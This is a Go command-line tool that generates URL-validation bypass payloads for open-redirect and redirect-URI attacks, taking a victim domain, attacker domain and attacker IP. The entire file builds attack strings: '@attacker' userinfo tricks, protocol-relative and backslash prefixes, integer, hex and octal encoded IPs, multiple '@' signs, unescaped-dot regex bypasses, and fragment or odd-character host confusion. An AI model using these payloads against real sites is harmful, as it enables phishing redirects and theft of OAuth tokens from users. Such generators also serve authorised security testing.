package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/dbzer0/ipfmt/src/ipfmt"
)

func main() {
	target := flag.String("target-domain", "victim.example", "victims domain")
	attackerdomain := flag.String("attacker-domain", "attacker.example", "attackers domain")
	attackerIP := flag.String("attacker-ip", "127.0.0.1", "attackers IP")
	proto := flag.String("proto", "https://", "protocol of victims url")
	path := flag.String("path", "", "an allowed path like /callback")
	flag.Parse()

	//different ways to start a url
	protocols := []string{"///", "/%09/", "/\\"}
	//chars allowed in subdomains which might confuse parsers to think the host part ended (many only work in Safari)
	subdomainchars := []string{",", "&", "'", "\"", ";", "!", "$", "^", "*", "(", ")", "+", "`", "~", "-", "_", "=", "|", "{", "}", "%", "%01", "%02", "%03", "%04", "%05", "%06", "%07", "%08", "%0b", "%0c", "%0e", "%0f", "%10", "%11", "%12", "%13", "%14", "%15", "%16", "%17", "%18", "%19", "%1a", "%1b", "%1c", "%1d", "%1e", "%1f", "%7f"}
	//seperators between target and malicious
	seperators := []string{"@", "."}
	//chars that end the host part
	endhostchars := []string{"/", "?", "\\", "#"}

	hosts := []string{*attackerdomain, *attackerdomain + "."}

	for _, domain := range hosts {
		//e.g. @attacker.com
		for _, seperator := range seperators {
			fmt.Println(seperator + domain)
		}
	}

	//Keep IPs and domains seperate for a while because we do not wanna generate .IP
	ip := net.ParseIP(*attackerIP)
	if ip == nil {
		fmt.Fprintln(os.Stderr, "Couldn't parse IP")
		return
	}
	ips := []string{"1.1", ipfmt.ToInt(ip), ipfmt.ToHex(ip), ipfmt.ToOctal(ip), ipfmt.ToSingleHex(ip), ipfmt.Combo(ip)}
	for _, ip := range ips {
		//e.g. @1.1
		fmt.Println("@" + ip)
	}
	//Merge IPs and the other hosts
	hosts = append(hosts, ips...)

	//e.g. /\attacker.com
	for _, domain := range hosts {
		for _, protocol := range protocols {
			fmt.Println(protocol + domain + *path)
		}
	}

	//contains
	fmt.Println("https://" + *attackerdomain + "/" + *proto + *target + *path)
	//port as pass
	for _, host := range hosts {
		fmt.Println(*proto + *target + ":443@" + host)
	}
	//mutliple @s
	fmt.Println("https://" + *target + "@" + *target + "@" + *attackerdomain + *path)
	// unescaped dots in regexes e.g. /sub.victim.com/ -> subavictim.com
	if len(strings.Split(*target, ".")) > 2 {
		fmt.Println(*proto + strings.Replace(*target, ".", "a", 1) + *path)
	}
	//e.g. https://victim.com@attacker.com
	for _, seperator := range seperators {
		hosts = append(hosts, *target+seperator+*attackerdomain)
	}
	//e.g. https://attacker.com#.victim.com
	for _, char := range endhostchars {
		hosts = append(hosts, *attackerdomain+char+"."+*target)
	}
	//e.g. https://victim.com(.attacker.com
	for _, char := range subdomainchars {
		hosts = append(hosts, *target+char+"."+*attackerdomain)
	}

	for _, domain := range hosts {
		fmt.Println(*proto + domain + *path)
	}
}
